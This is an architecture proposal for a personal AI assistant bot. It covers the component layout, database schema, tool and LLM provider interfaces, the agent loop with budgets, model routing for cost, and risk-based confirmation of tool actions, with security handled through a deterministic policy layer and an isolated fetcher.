# Personal AI Operations Bot — System Architecture (v0.1, for approval)

**Status:** Proposed — awaiting approval before implementation
**Author:** Lead architect
**Scope:** Deliverables 1, 2, 3, 8 (architecture, database, repository, roadmap) + the exact definition of Milestone 1

---

## 0. Assumptions I am making (state now, correct me if wrong)

These are the assumptions I'm proceeding on. The ones marked **[LOCKING]** are expensive to reverse later; the rest are cheap to change.

| # | Assumption | Reversible? |
|---|---|---|
| A1 | Single owner/user for v1, but the schema and auth model are multi-user from day one | **[LOCKING]** — designed in |
| A2 | You are in India: default currency INR, default timezone `Asia/Kolkata`, but both are per-user columns | Cheap |
| A3 | Primary LLM = Anthropic (Claude) with a small/cheap model for classification and extraction; provider is swappable | Cheap |
| A4 | Telegram is the first messaging adapter; WhatsApp Cloud API is added in a later milestone (see §8.3 for why this matters more than you'd think) | Cheap |
| A5 | Docker is available on your laptop and you're willing to run Postgres in a container locally | **[LOCKING]** — see D2 |
| A6 | Eventual production target is a single small VM (2–4 vCPU, 4–8 GB RAM) that you control, not a Kubernetes cluster | Cheap |
| A7 | Python is the implementation language | **[LOCKING]** — see D1 |
| A8 | No arbitrary code execution tool in v1 | Cheap (to add later, with sandbox) |
| A9 | Budget target: under ~$10–15/month of LLM+API spend at personal usage levels | Design constraint, not locking |

---

## 1. My understanding of the project

You are not asking for a chatbot. You are asking for a **personal operating system with a conversational front door**.

The distinction that matters architecturally: in a chatbot, the LLM *is* the product. Here the LLM is a **natural-language dispatcher** sitting in front of a set of ordinary, boring, well-tested services (an expense ledger, an attendance register, a reminder scheduler, a scraper). Those services must be correct, queryable, and useful even if the LLM is removed entirely.

That leads to the three organising principles I'll hold throughout:

1. **The database is the product; the LLM is the interface.** Structured facts (₹850, 2026-08-10, "Absolute Barbecue") live in typed columns with constraints, not in a vector store and not in a prompt. `expense_summary` returns a number computed by SQL, not a number the model added up.
2. **The LLM is an untrusted, non-deterministic component inside a trusted system** — not the system's controller. Every consequential action passes through a deterministic policy layer that the model cannot argue its way past.
3. **Boundaries now, processes later.** One codebase, one deployable unit (a modular monolith), but with interface seams sharp enough that any module could be extracted into a service without a rewrite. Splitting into microservices on day one for a single user would be a pure cost.

---

## 2. Architecture overview

The system is a **modular monolith with two runtime process types** plus infrastructure:

- **`api`** — FastAPI process. Receives webhooks/polls, normalizes messages, runs the agent turn, serves the dashboard API. Latency-sensitive, does no heavy lifting.
- **`worker`** — job worker process. Media processing, transcription, scraping, embedding, summarization, reminder delivery, scheduled jobs. Everything slow or expensive.
- **`fetcher`** *(from M6)* — a network-isolated process/container that is the only component allowed to make outbound HTTP requests to arbitrary user- or model-supplied URLs. This is the SSRF and prompt-injection blast-radius boundary.

Same image, different entrypoints, same config. Locally you run `docker compose up` or run `api` and `worker` on the host against containerized Postgres.

### 2.1 High-level diagram

```mermaid
flowchart TB
    subgraph Clients
        WA[WhatsApp]
        TG[Telegram]
        CLI[CLI / Dev REPL]
        DASH[Admin Dashboard]
    end

    subgraph API["api process — FastAPI"]
        WH[Webhook Endpoints<br/>signature verification]
        NORM[Message Normalizer<br/>to canonical envelope]
        SESS[Session / Conversation Manager<br/>dedupe, locking, turn state]
        CTX[Context Builder<br/>assembles working memory]
        AGENT[Agent Orchestrator<br/>bounded tool loop]
        POL[Policy + Permission Engine<br/>deterministic, pre-execution]
        CONF[Confirmation Manager<br/>pending high-risk actions]
        REG[Tool Registry]
        OUT[Outbound Renderer<br/>capability-aware]
        RESTAPI[REST + SSE API]
    end

    subgraph LLM["LLM Layer"]
        ROUTER[Model Router<br/>role to provider+model]
        PA[Anthropic Adapter]
        PO[OpenAI Adapter]
        PL[Local / Ollama Adapter]
    end

    subgraph Tools["Tool Modules — each independently testable"]
        T1[Notes]
        T2[Expenses]
        T3[Attendance]
        T4[Tasks]
        T5[Reminders]
        T6[Memory]
        T7[Search + Fetch]
        T8[Scraper]
        T9[Media]
        T10[Knowledge Retrieval]
    end

    subgraph WORKER["worker process"]
        JQ[Job Consumer]
        MED[Media Pipelines<br/>OCR, ASR, video]
        SCR[Scrape Pipeline]
        EMB[Embedding Pipeline]
        SUMM[Summarizer / Memory Extractor]
        SCHED[Scheduler Ticker<br/>due jobs to queue]
        NOTIF[Proactive Notifier]
    end

    subgraph FETCH["fetcher — network isolated"]
        HTTPF[HTTP Fetcher<br/>SSRF guard]
        PW[Playwright Browser<br/>sandboxed]
    end

    subgraph Data
        PG[(PostgreSQL + pgvector<br/>relational + FTS + embeddings<br/>+ job queue)]
        OBJ[(Object Storage<br/>local FS or S3-compatible)]
        RD[(Redis — optional<br/>cache, locks, rate limits)]
    end

    subgraph External
        LLMAPI[LLM APIs]
        SRCH[Search API]
        ASR[Transcription<br/>local Whisper or hosted]
        WEB[Arbitrary Websites]
    end

    WA --> WH
    TG --> WH
    CLI --> NORM
    DASH --> RESTAPI

    WH --> NORM --> SESS --> CTX --> AGENT
    CTX -.reads.-> PG
    AGENT <--> ROUTER
    ROUTER --> PA & PO & PL --> LLMAPI
    AGENT -->|proposed tool call| POL
    POL -->|allowed| REG --> Tools
    POL -->|needs approval| CONF --> OUT
    POL -->|denied| AGENT
    Tools --> PG
    Tools -->|enqueue slow work| PG
    AGENT --> OUT --> WA & TG & CLI

    PG --> JQ
    JQ --> MED & SCR & EMB & SUMM & NOTIF
    SCHED --> PG
    MED --> OBJ & PG
    MED --> ASR
    SCR --> HTTPF & PW
    HTTPF & PW --> WEB
    SCR --> PG & OBJ
    EMB --> PG
    NOTIF --> OUT
    T7 --> SRCH
    AGENT -.traces.-> PG
    SESS -.locks.-> RD
```

### 2.2 What changed from your sketch, and why

Your original chain was `Gateway → Normalizer → Session → Agent → Tool Router → Tools → Storage`. That's basically right. Four additions:

1. **A Policy/Permission Engine between the agent and the tool registry.** In your sketch the agent calls the router directly. That makes the LLM the authorizer. Deterministic policy must sit in the path, not beside it.
2. **A Context Builder as a first-class component.** "What goes into the prompt" is the single biggest driver of both quality and cost. It deserves its own module with its own tests, not ad-hoc string concatenation inside the agent.
3. **A network-isolated fetcher.** The moment the bot browses arbitrary websites, the process doing the fetching is the one an attacker gets to influence. It should hold no credentials and reach no internal network.
4. **The job queue lives in Postgres, not Redis.** See D3 — this buys transactional enqueue and removes a required dependency.

---

## 3. Component responsibilities

| Component | Owns | Explicitly does NOT do |
|---|---|---|
| **Messaging Provider** (per platform) | Webhook signature verification, protocol parsing, media download via platform API, outbound send, capability declaration | Business logic, LLM calls, persistence decisions |
| **Message Normalizer** | Converts platform payloads into the canonical `IncomingMessage` envelope; idempotency via `(provider, provider_message_id)` | Interpreting intent |
| **Session Manager** | Resolves identity to user, opens/continues conversation, per-conversation advisory lock (no two turns racing), dedupe, turn lifecycle, typing indicators | Prompt assembly |
| **Context Builder** | Assembles the working set: system prompt, recent messages, rolling summary, retrieved memories, retrieved KB chunks, tool schemas — under an explicit token budget | Deciding which tool to call |
| **Agent Orchestrator** | The bounded loop: call model → receive tool calls → submit to policy → execute → feed results → repeat → final answer. Enforces step/token/time/cost budgets | Executing tools directly; authorizing anything |
| **Policy Engine** | Deterministic pre-execution decision: `ALLOW` / `DENY` / `REQUIRE_CONFIRMATION`, based on tool risk, scopes, user grants, and **context taint** | Being persuadable by model output |
| **Confirmation Manager** | Creates pending confirmations bound to an argument hash + TTL, renders them, resolves them on user reply | Executing without a match |
| **Tool Registry** | Explicit registration, JSON-Schema generation from Pydantic models, argument validation, timeouts, error normalization | Business logic |
| **Tool module** | One capability. `service.py` = pure business logic (no LLM, no messaging); `tool.py` = thin LLM-facing wrapper | Knowing about Telegram, prompts, or other tools |
| **LLM Provider adapters** | Translate canonical request/response, map tool schemas, normalize errors and usage accounting, retries with backoff | Prompt content, tool selection policy |
| **Model Router** | Maps a *role* (`chat`, `cheap`, `reasoning`, `vision`, `extract`, `embed`, `transcribe`) to a concrete provider+model from config | Being referenced by name anywhere in tool code |
| **Job system** | Durable enqueue, retries with backoff, dead-lettering, periodic ticks, per-job idempotency keys | Business logic |
| **Scheduler Ticker** | Polls `scheduled_jobs` for due rows, computes next occurrence from RRULE in the user's timezone, enqueues execution | Being the source of truth for reminders — the table is |
| **Media Pipelines** | Download → hash → store → probe/validate → extract (OCR/ASR/frames) → structure → persist | Replying to the user directly (it emits an outbound message via the renderer) |
| **Fetcher** | SSRF-guarded HTTP, robots.txt, rate limiting, conditional GET, optional Playwright rendering | Interpreting content, holding secrets |
| **Memory subsystem** | Write/read/update/forget across the memory layers, dedupe, provenance, hybrid retrieval | Storing structured domain data (that belongs in domain tables) |
| **Outbound Renderer** | Converts a canonical `OutgoingMessage` into platform-specific form, degrading gracefully (buttons → numbered list), chunking long text | Deciding what to say |

---

## 4. Data flow — the life of a message

### 4.1 Text turn (synchronous path, target < 4s)

1. Webhook arrives → **signature verified** → payload parsed → **202 returned immediately** (Telegram and Meta both retry on non-2xx or slow responses; never do work before acking).
2. Normalizer produces `IncomingMessage`. Idempotency check on `(provider, provider_message_id)` — duplicates dropped.
3. Session Manager resolves `identity → user` (allowlist; unknown senders are logged and ignored), opens/continues a `conversation`, takes a Postgres advisory lock keyed on conversation id, persists the inbound `message` row, opens an `agent_run`.
4. Context Builder assembles: system prompt + policy preamble → rolling summary → last N messages → retrieved memories (only if the query looks memory-dependent) → tool schemas → user message. Token budget enforced, oldest-first eviction.
5. Agent calls the model with tools. Loop, bounded by `max_steps`, `max_tokens`, `deadline`, `max_cost`.
6. For each proposed tool call: validate args against schema → Policy Engine → execute or ask for confirmation or deny. Every call and result written to `tool_calls` with duration, status, and truncated payloads.
7. Tools that would be slow return **immediately with a job handle** ("I'm working on that") and enqueue to the worker.
8. Final text → `OutgoingMessage` → renderer → provider send → persisted as an outbound `message`. `agent_run` closed with usage/cost totals.

### 4.2 Media turn (asynchronous path)

Inbound media → immediate ack to the user ("Got the voice note, transcribing…") → media downloaded by the provider adapter → content-addressed by SHA-256 → stored in object storage → `media_object` row → job enqueued → worker runs the pipeline → structured result persisted → worker emits a follow-up outbound message referencing the original message. If the same file is sent twice, the hash short-circuits reprocessing.

### 4.3 Proactive turn (no user input)

Ticker finds a due `scheduled_job` → enqueues → worker executes (deliver reminder / run scrape / build weekly expense summary) → renderer sends outbound message → job's `next_run_at` recomputed from RRULE in the user's timezone → run recorded in `job_runs`.

---

## 5. Technology stack

### 5.1 Recommended stack

| Layer | Choice | Why this one |
|---|---|---|
| Language | **Python 3.12+** | Non-negotiable given the workload mix: Whisper/faster-whisper, Playwright, ffmpeg wrappers, OCR, PDF parsing, embeddings, and every LLM SDK are Python-first. A TypeScript backend would mean shelling out to Python for half the features. |
| Web framework | **FastAPI + Uvicorn** | Async-native (you'll be I/O-bound on LLM + HTTP calls), Pydantic-native so tool schemas and API schemas share one type system, free OpenAPI for the dashboard. |
| Validation / settings | **Pydantic v2 + pydantic-settings** | One definition serves as: tool argument schema, JSON Schema for the LLM, API request model, and runtime validator. This is the keystone of the tool system. |
| ORM / DB access | **SQLAlchemy 2.0 (async) + Alembic** | Mature async support, explicit query construction, real migrations. |
| Database | **PostgreSQL 16 + pgvector** | Relational data, JSONB, full-text search, vector search, *and* the job queue in one engine. One backup, one connection string, one thing to operate. |
| Job queue + scheduler | **Procrastinate** (Postgres-backed, asyncio, periodic tasks) behind a `JobQueue` interface | Transactional enqueue — a job and the row it references commit together. No Redis required. See D3. |
| Cache / locks / rate limit | **Redis (optional)** | Genuinely useful for HTTP caching, per-domain token buckets, dedupe sets. Not required for correctness — Postgres advisory locks cover the critical paths. |
| Object storage | **`StorageProvider` interface**: local filesystem impl for dev, S3-compatible (MinIO / Cloudflare R2 / Backblaze B2) for prod | R2/B2 have no egress fees, which matters for media. |
| LLM | Provider SDKs directly (`anthropic`, `openai`, `ollama`) behind own `LLMProvider` interface | See D4 — no LangChain. |
| Embeddings | Local **`bge-m3`** or **`gte-multilingual`** via `sentence-transformers`/ONNX; hosted (Voyage/OpenAI) as an alternative behind `EmbeddingProvider` | Embeddings are the highest-volume model call. Running them locally makes them free and keeps your personal data off third-party servers. CPU is fine at personal volume. |
| Transcription | **faster-whisper** (CTranslate2) locally; hosted fallback behind `TranscriptionProvider` | `base`/`small` on CPU is adequate for voice notes; `large-v3` if you have a GPU. Free and private. |
| OCR | **Vision LLM primary**, RapidOCR/Tesseract as cheap local fallback | For handwriting and receipts, a VLM massively outperforms classical OCR. Use the cheap path for clean printed text to save money. |
| HTML extraction | **trafilatura** (boilerplate removal) + **selectolax** or BeautifulSoup for targeted extraction | trafilatura is the best-in-class main-content extractor and outputs clean markdown. |
| Browser automation | **Playwright** (only when needed) | Escalation tier, not the default fetcher. |
| Web search | **`SearchProvider` interface**; Brave Search API or Tavily; self-hosted SearXNG as a free option | Cheap, no scraping of Google. |
| Media processing | **ffmpeg** (via `ffmpeg-python`/subprocess with strict arg construction), Pillow, pypdfium2 | Standard, boring, works. |
| Logging | **structlog** → JSON to stdout | Machine-parseable from day one; contextvars carry request/conversation/run IDs. |
| Tracing / metrics | **OpenTelemetry** + `prometheus-fastapi-instrumentator`; agent traces additionally in Postgres | The DB copy is what makes "why did you answer that?" answerable *by the bot itself*. |
| Errors | Sentry (or self-hosted GlitchTip) | Optional, off by default. |
| Containers | Docker + Docker Compose | |
| Testing | pytest, pytest-asyncio, testcontainers (real Postgres), respx/vcr for HTTP, custom eval harness for agent behavior | |
| Quality gates | ruff, mypy (strict on `core/`), **import-linter** | import-linter mechanically enforces the layering (see §16.2) so the architecture doesn't rot. |

### 5.2 Things I evaluated and am recommending *against*

| Rejected | Why |
|---|---|
| **LangChain / LlamaIndex as the backbone** | The agent loop is ~300 lines you should own. These frameworks hide control flow exactly where you need it visible: which tools were offered, what the policy decided, what went into the context, what it cost. They also churn hard between versions. Use them at most as a source of individual utilities. |
| **SQLite for local dev alongside Postgres** | You asked for this "if practical". It isn't — see D2. |
| **Celery** | Heavyweight, sync-first, its own config universe, and its scheduler (`beat`) is a separate process with a weak persistence story. Overkill for one user. |
| **Scrapy** | Excellent standalone crawler framework, but it wants to own the process and the event loop. Fighting Twisted from inside a FastAPI app is not worth it. A fetcher + trafilatura + a job per URL is simpler and enough. |
| **A dedicated vector DB (Qdrant/Weaviate/Chroma)** | pgvector with HNSW handles millions of vectors comfortably. At your scale (tens of thousands), a separate service is pure operational tax and it breaks transactional consistency between a note and its embedding. Revisit only if recall/latency actually becomes a problem. |
| **Kafka / RabbitMQ** | Wrong scale entirely. |
| **Microservices from day one** | Would multiply deployment and debugging cost for zero benefit at one user. |
| **Unofficial WhatsApp libraries (whatsapp-web.js, Baileys)** | Ban-risk, brittle, ToS-violating, and require keeping a phone session alive. Official Cloud API only. |

---

## 6. Database architecture

### 6.1 Global conventions

- **IDs:** UUIDv7 (time-ordered → good index locality, unlike UUIDv4; no cross-table collisions, unlike bigserial).
- **Time:** every timestamp is `TIMESTAMPTZ` stored in UTC. `users.timezone` (IANA string) drives all rendering and all recurrence math. Never store naive local time.
- **Money:** `amount_minor BIGINT` + `currency CHAR(3)`. Never floats, never `NUMERIC` alone without an explicit currency.
- **Soft delete:** `deleted_at TIMESTAMPTZ NULL` **only on user-visible content** (notes, expenses, tasks, memories, messages, documents). Logs, traces and job runs are hard-retained then purged by age. Every query goes through a repository that applies `WHERE deleted_at IS NULL` by default; unique indexes are partial (`... WHERE deleted_at IS NULL`).
- **Metadata:** a `metadata JSONB DEFAULT '{}'` escape hatch on most entities — with the rule that anything queried more than twice gets promoted to a real column with an index.
- **Provenance:** anything derived (a memory, an extraction, a summary) carries `source_type` + `source_id` + `created_by_run_id`.
- **Multi-tenancy:** `user_id` on every user-scoped table from day one, even at one user. Retrofitting it later is the single most painful migration in this class of system.

### 6.2 ER diagram (core entities)

```mermaid
erDiagram
    users ||--o{ identities : has
    users ||--o{ conversations : owns
    conversations ||--o{ messages : contains
    messages ||--o{ media_objects : attaches
    messages ||--o{ agent_runs : triggers
    agent_runs ||--o{ agent_steps : has
    agent_steps ||--o{ tool_calls : issues
    tool_calls ||--o| confirmations : may_require
    agent_runs ||--o{ llm_usage : records

    users ||--o{ notes : owns
    users ||--o{ tasks : owns
    users ||--o{ expenses : owns
    users ||--o{ reminders : owns
    users ||--o{ memories : owns
    users ||--o{ documents : owns
    users ||--o{ scraped_sources : owns
    users ||--o{ courses : owns

    expenses }o--|| expense_categories : classified_as
    expenses }o--o| media_objects : receipt

    courses ||--o{ course_sessions : schedules
    course_sessions ||--o{ attendance_records : records

    reminders ||--o{ scheduled_jobs : materializes
    scraped_sources ||--o{ scrape_runs : produces
    scrape_runs ||--o| documents : yields
    documents ||--o{ document_chunks : split_into

    memories ||--o| embeddings : indexed_by
    document_chunks ||--o| embeddings : indexed_by
    messages ||--o| embeddings : indexed_by

    users ||--o{ audit_log : generates
    scheduled_jobs ||--o{ job_runs : executes
```

### 6.3 Table groups

**Identity & messaging**

| Table | Key columns | Notes |
|---|---|---|
| `users` | `id`, `display_name`, `timezone`, `default_currency`, `locale`, `is_active`, `settings JSONB` | |
| `identities` | `id`, `user_id`, `provider` (enum), `external_id`, `display_name`, `verified_at` | **Unique `(provider, external_id)`.** This is the allowlist: no identity row → message ignored. |
| `conversations` | `id`, `user_id`, `provider`, `provider_chat_id`, `title`, `summary TEXT`, `summary_through_message_id`, `last_message_at`, `state JSONB` | `summary` is the rolling L2 memory. Unique `(provider, provider_chat_id)`. |
| `messages` | `id`, `conversation_id`, `user_id`, `direction` (in/out), `role`, `provider_message_id`, `text`, `reply_to_message_id`, `trust_tier`, `sent_at`, `metadata` | **Unique `(conversation_id, provider_message_id)`** = idempotency. Index `(conversation_id, sent_at DESC)`. `tsvector` GIN index for FTS. |
| `media_objects` | `id`, `user_id`, `message_id`, `kind`, `mime_type`, `size_bytes`, `sha256`, `storage_key`, `status`, `duration_ms`, `width`, `height`, `error` | **Unique `(user_id, sha256)`** → free deduplication and idempotent reprocessing. |

**Agent tracing** (this group is what makes the system debuggable)

| Table | Key columns | Notes |
|---|---|---|
| `agent_runs` | `id`, `conversation_id`, `trigger_message_id`, `status`, `started_at`, `ended_at`, `total_tokens_in/out`, `cost_micros`, `model_role`, `stop_reason`, `error` | One row per turn. |
| `agent_steps` | `id`, `run_id`, `step_no`, `kind` (llm_call / tool_batch), `prompt_digest`, `context_summary JSONB`, `latency_ms` | `context_summary` records *what was retrieved and why* — memory ids, chunk ids, token counts. |
| `tool_calls` | `id`, `run_id`, `step_id`, `tool_name`, `arguments JSONB`, `args_hash`, `policy_decision`, `status`, `result JSONB`, `result_truncated BOOL`, `error`, `duration_ms` | The audit spine for tool execution. |
| `confirmations` | `id`, `user_id`, `tool_call_id`, `args_hash`, `rendered_prompt`, `status`, `expires_at`, `resolved_at`, `resolved_by_message_id` | Confirmation is bound to `args_hash` — arguments cannot change between ask and execute. |
| `llm_usage` | `id`, `run_id`, `provider`, `model`, `role`, `tokens_in`, `tokens_out`, `cached_tokens`, `cost_micros`, `created_at` | Cost tracking and budget enforcement. |
| `audit_log` | `id`, `user_id`, `actor` (user/agent/system), `action`, `entity_type`, `entity_id`, `before JSONB`, `after JSONB`, `run_id`, `created_at` | Append-only. Every write by a tool lands here. |

**Domain data**

| Table | Notable design points |
|---|---|
| `notes` | `title`, `body`, `tags TEXT[]`, `source_message_id`, `pinned`, FTS `tsvector` GIN index, GIN on `tags`. |
| `tasks` | `title`, `description`, `status` enum, `priority` smallint, `due_at`, `completed_at`, `project_id` (nullable, forward-looking), `parent_task_id` for subtasks. |
| `expenses` | `amount_minor`, `currency`, `occurred_on DATE`, `occurred_at TIMESTAMPTZ NULL`, `category_id`, `merchant`, `payment_method`, `description`, `tags TEXT[]`, `receipt_media_id`, `source` (chat/ocr/import), `confidence`. Index `(user_id, occurred_on)`, `(user_id, category_id, occurred_on)`. |
| `expense_categories` | Per-user, seeded with defaults, `parent_id` for hierarchy. Keeping categories relational (not free text) is what makes "food last month" answerable exactly. |
| `courses` | The attendance generalisation: a course/class/event series. `name`, `code`, `schedule_rrule`, `min_attendance_pct`, `active`. |
| `course_sessions` | One scheduled occurrence: `course_id`, `starts_at`, `ends_at`, `session_no`, `cancelled`. Sessions are materialised from the RRULE so you can mark attendance for a specific occurrence and later ask "who was absent last Tuesday". |
| `attendance_records` | `session_id`, `subject_id` (nullable — *who*; for now the user, later classmates), `status` enum (present/absent/late/excused), `marked_at`, `marked_via`, `note`. Unique `(session_id, subject_id)`. |
| `reminders` | The **user-facing intent**: `text`, `rrule TEXT NULL`, `timezone`, `next_fire_at`, `starts_at`, `ends_at`, `active`, `channel`. Separate from the queue. |
| `scheduled_jobs` | The **durable execution record**: `kind`, `payload JSONB`, `rrule`, `timezone`, `next_run_at`, `last_run_at`, `status`, `failure_count`, `owner_type/owner_id`. Index `(status, next_run_at)` — the ticker's hot path. |
| `job_runs` | `scheduled_job_id`, `started_at`, `finished_at`, `status`, `error`, `output JSONB`. Retention-purged. |

**Knowledge & memory**

| Table | Notable design points |
|---|---|
| `memories` | `kind` (fact / preference / entity / procedure / episodic_summary), `subject` TEXT, `content` TEXT, `structured JSONB`, `scope` (global/conversation/project), `confidence` REAL, `source_type`, `source_id`, `valid_from`, `valid_until`, `superseded_by_id`, `pinned`, `last_accessed_at`, `access_count`, `deleted_at`. Contradiction handling = supersession, not overwrite. |
| `documents` | Anything ingested: web page, PDF, transcript, image extraction. `source_url`, `source_type`, `title`, `author`, `published_at`, `fetched_at`, `content_sha256`, `normalized_sha256`, `raw_storage_key`, `text`, `lang`, `scrape_run_id`. `normalized_sha256` (boilerplate/timestamps stripped) is what change detection compares. |
| `document_chunks` | `document_id`, `ordinal`, `text`, `token_count`, `heading_path TEXT[]`, `char_start/char_end`. Chunking is structure-aware, and `heading_path` gives citations real context. |
| `embeddings` | `id`, `model`, `dim`, `embedding vector(1024)`, plus **three nullable FKs** `memory_id` / `document_chunk_id` / `message_id` with a `CHECK` that exactly one is non-null, each `ON DELETE CASCADE`. This gives real referential integrity and automatic cleanup, unlike a generic `(owner_type, owner_id)` polymorphic table. HNSW index on `embedding`. |
| `scraped_sources` | `url`, `name`, `mode` (once/schedule/monitor), `rrule`, `selector_spec JSONB`, `extraction_schema JSONB`, `render` (http/browser), `last_status`, `notify_on_change`, `active`. |
| `scrape_runs` | `source_id`, `started_at`, `http_status`, `content_sha256`, `changed BOOL`, `diff JSONB`, `error`, `document_id`. |
| `extracted_data` | Structured facts pulled from a document against `extraction_schema` — e.g. `{"price": 9990, "in_stock": true}` with `document_id`, `run_id`, `values JSONB`. This is what price-drop alerts compare, not raw HTML. |

### 6.4 Indexing strategy (the ones that matter)

- `identities (provider, external_id)` UNIQUE — auth hot path.
- `messages (conversation_id, sent_at DESC)` — context window assembly.
- `messages (conversation_id, provider_message_id)` UNIQUE — idempotency.
- GIN on `to_tsvector('simple', ...)` for `messages`, `notes`, `documents.text`, `document_chunks.text` — lexical half of hybrid search. (Use `simple` config, or `english` + a Hindi-aware path later; Indian-English mixed text does poorly with aggressive stemming.)
- HNSW on `embeddings.embedding` with `vector_cosine_ops`, `m=16, ef_construction=64`.
- `scheduled_jobs (status, next_run_at)` partial `WHERE status='pending'` — polled every few seconds, must be tiny.
- `expenses (user_id, occurred_on)` and `(user_id, category_id, occurred_on)` — every summary query.
- `attendance_records (session_id, subject_id)` UNIQUE.
- `memories (user_id, kind)` + GIN on `to_tsvector(content)` + partial `WHERE deleted_at IS NULL AND superseded_by_id IS NULL`.
- `tool_calls (run_id)`, `agent_runs (conversation_id, started_at DESC)` — trace lookup.

### 6.5 Migrations

Alembic, forward-only, one migration per PR, `--autogenerate` **always reviewed by hand** (it misses index changes, enum alterations and constraint renames). Destructive changes use expand/contract: add new column → backfill in a job → dual-write → switch reads → drop old column in a later release. `alembic upgrade head` runs on container start in dev, and as an explicit deploy step in prod (never automatically in a multi-replica prod, but at one replica it's fine).

**Seed data**: default expense categories, the owner user + identity, and a `system_settings` row, via an idempotent `scripts/seed.py`.

---

## 7. Agent & tool architecture

### 7.1 Core interfaces

Deliberately small. Small interfaces are what make providers swappable; large ones leak.

```python
# core/interfaces/llm.py
class LLMProvider(Protocol):
    name: str
    async def complete(self, req: LLMRequest) -> LLMResponse: ...
    async def stream(self, req: LLMRequest) -> AsyncIterator[LLMDelta]: ...

@dataclass(frozen=True)
class LLMRequest:
    model: str
    system: str | None
    messages: list[LLMMessage]          # canonical, provider-neutral
    tools: list[ToolSchema] | None
    tool_choice: ToolChoice
    max_tokens: int
    temperature: float
    response_schema: type[BaseModel] | None   # forces structured output
    metadata: RequestMeta                      # run_id, role, budget, deadline

@dataclass(frozen=True)
class LLMResponse:
    text: str | None
    tool_calls: list[ProposedToolCall]
    usage: Usage                # tokens in/out/cached -> cost
    stop_reason: StopReason     # end_turn | tool_use | max_tokens | refusal | error
    raw: dict                   # kept for debugging, never parsed by callers
```

```python
# core/interfaces/tool.py
class Tool(Protocol):
    name: str                       # snake_case, stable, part of the eval suite
    description: str                # written for the model, tested by evals
    args_model: type[BaseModel]     # -> JSON Schema
    result_model: type[BaseModel]
    risk: RiskLevel                 # LOW | MEDIUM | HIGH
    scopes: frozenset[Scope]        # READ, WRITE, DELETE, EGRESS, SPEND, EXEC
    allowed_in_tainted_context: bool
    idempotent: bool
    timeout_s: float
    async def run(self, args: BaseModel, ctx: ToolContext) -> ToolResult: ...
```

Other interfaces, same spirit: `MessageProvider`, `StorageProvider`, `EmbeddingProvider`, `TranscriptionProvider`, `SearchProvider`, `MemoryStore`, `JobQueue`, `Clock`. `Clock` sounds silly until you write tests for recurring reminders across a DST boundary — inject it.

Wiring: constructor injection with a small hand-rolled container assembled in `bootstrap.py` from config. **No DI framework** — a 60-line composition root is clearer than a magic container and makes tests trivial (`build_container(overrides=...)`).

### 7.2 The agent loop

```mermaid
sequenceDiagram
    participant U as User
    participant S as Session Mgr
    participant C as Context Builder
    participant A as Agent
    participant M as Model Router
    participant P as Policy Engine
    participant T as Tool
    participant D as Postgres

    U->>S: message
    S->>D: persist, lock conversation, open run
    S->>C: build context
    C->>D: summary + recent msgs + memories + tool schemas
    C-->>A: WorkingContext (token-budgeted)
    loop max_steps / budget / deadline
        A->>M: complete(messages, tools)
        M-->>A: text and/or tool_calls
        alt tool calls proposed
            A->>P: authorize(tool, args, taint)
            alt DENY
                P-->>A: denial reason (fed back as tool result)
            else REQUIRE_CONFIRMATION
                P->>D: create confirmation (args_hash, TTL)
                A-->>U: "Confirm: delete 47 expenses?"
                Note over A: run suspends, resumes on reply
            else ALLOW
                P->>T: execute(validated args)
                T->>D: read/write + audit_log
                T-->>A: ToolResult (typed, size-capped, tagged with trust tier)
            end
        else final answer
            A-->>U: response
        end
    end
    A->>D: close run with usage + cost
```

Hard budgets per turn, all configurable: `max_steps=8`, `max_tool_calls=12`, `max_wall_clock=45s`, `max_cost_micros`. Exceeding any of them ends the turn with an honest message rather than an infinite loop. A tool erroring is **not** a turn failure — the error is normalized into a `ToolResult(status=error, message=...)` and handed back to the model, which usually recovers by fixing arguments.

### 7.3 Adding a tool

A tool is a directory:

```
src/aiops/tools/expenses/
    __init__.py
    models.py      # SQLAlchemy models (or import from db.models)
    service.py     # pure business logic — no LLM, no messaging, unit-testable
    tool.py        # thin adapters: args model, description, risk, scopes, run()
    tests/
```

Registration is an **explicit list** in `tools/registry.py`, not filesystem auto-discovery. In a system where registration grants capability, discovery-by-import is a security smell and a debugging nightmare. Adding `book_movie_ticket` = new directory + one line in the registry + one line in the eval suite. The agent is untouched.

**Tool design rules** (these matter more than the framework):
- Return **computed answers, not raw rows** — `expense_summary` returns totals per category from SQL. Never make the model do arithmetic over 200 rows; it will be wrong and expensive.
- Results are size-capped and truncated with an explicit `truncated: true` flag and a follow-up handle.
- Every result carries a `trust` tag. `search_notes` → `TRUSTED`. `fetch_page` → `UNTRUSTED` (§13.2).
- Slow operations return a job handle immediately; they never block the turn.
- Errors are typed (`NotFound`, `ValidationError`, `RateLimited`, `Upstream`) so the model can react appropriately.

### 7.4 Model routing (cost control)

Config maps *roles* to concrete models; no tool or prompt ever names a model directly.

| Role | Used for | Suggested default |
|---|---|---|
| `chat` | Main conversational turn with tools | Mid-tier model (Sonnet-class) |
| `cheap` | Classification, routing, tagging, dedupe checks, title generation | Small model (Haiku-class) or a local 3–8B via Ollama |
| `reasoning` | Multi-step planning, ambiguity, conflict resolution | Top-tier model, escalated to |
| `vision` | OCR, receipts, screenshots, video frames | Vision-capable model |
| `extract` | Untrusted-content → structured Pydantic object, **no tools attached** | Small model, forced JSON |
| `embed` | Embeddings | Local `bge-m3` |
| `transcribe` | Audio | Local faster-whisper |

**Escalation rules** (rather than fragile upfront intent classification): start every turn on `chat`; escalate to `reasoning` when the loop passes step 4, when the model emits low confidence, or when the user's message trips a complexity heuristic. Downgrade to `cheap` for turns that match a deterministic fast path (e.g. a message that is a bare confirmation `yes`/`no` never reaches an LLM at all — it's resolved by the Confirmation Manager).

Other cost levers, in order of impact: **prompt caching** on the static system+tool-schema prefix (largest single win); rolling summarization so context doesn't grow without bound; retrieving memories only when the query needs them; local embeddings; batching embedding jobs; caching scraped pages with conditional GET; and storing structured results so the same question is answered from SQL next time instead of re-reasoning.

### 7.5 Risk levels & confirmation

| Risk | Examples | Behavior |
|---|---|---|
| **LOW** | `create_note`, `search_notes`, `list_tasks`, `search_web`, `expense_summary` | Auto-execute |
| **MEDIUM** | `add_expense`, `create_reminder`, `mark_attendance`, `update_note`, `fetch_page` | Auto-execute, but audit-logged and trivially undoable (`undo` tool reads `audit_log`) |
| **HIGH** | `delete_*`, bulk updates (>N rows), `send_email`, `send_message`, purchases, `forget_memories`, any `EXEC` scope | Always require explicit confirmation |

